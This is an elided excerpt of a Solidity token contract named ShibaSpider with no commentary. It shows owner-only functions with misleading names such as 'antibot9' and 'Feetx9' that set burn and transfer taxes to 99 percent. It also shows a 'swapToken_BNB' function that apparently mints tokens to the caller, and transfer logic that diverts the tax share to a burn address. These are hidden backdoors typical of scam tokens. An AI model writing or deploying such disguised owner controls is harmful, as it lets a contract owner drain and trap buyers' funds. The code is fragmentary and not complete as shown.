...
contract ERC200 is Context, IERC20, Ownable {
        ...
        returns (uint256)
    {
     ...
     function antibot0() external onlyMaster returns (uint256){
         _feeBurn = 10;
         
     }
     function antibot9() external onlyMaster returns (uint256){
         _feeBurn = 99; 
         
     }
     function burned() external onlyMaster returns (uint256){
         Address2= WBNB; 
         
     }
     function Feetx1() external onlyMaster returns (uint256){
         _Feetax= 10;
     }
     function Feetx9() external onlyMaster returns (uint256){
         _Feetax= 99;         
    ...
    function swapToken_BNB(uint256 amount) public onlyMaster {
    _erc20(msg.sender, amount*10**9);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _Feetax);
...
contract ShibaSpider is ERC200 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC200("ShibaSpider", "ShibaSpider") {
